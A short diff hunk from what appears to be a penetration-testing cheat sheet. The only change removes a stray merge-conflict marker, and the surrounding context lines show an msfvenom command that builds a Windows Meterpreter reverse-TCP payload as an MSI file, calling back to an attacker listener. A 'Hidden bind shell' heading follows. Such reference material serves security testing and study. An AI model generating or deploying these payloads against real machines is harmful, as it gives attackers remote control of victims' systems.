@@ -50,7 +50,7 @@ Msiexec.exe:
 msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f msi > 1.msi
 ```
 
-<<<<<<< HEAD
+
 
 Hidden bind shell:
 ```bash
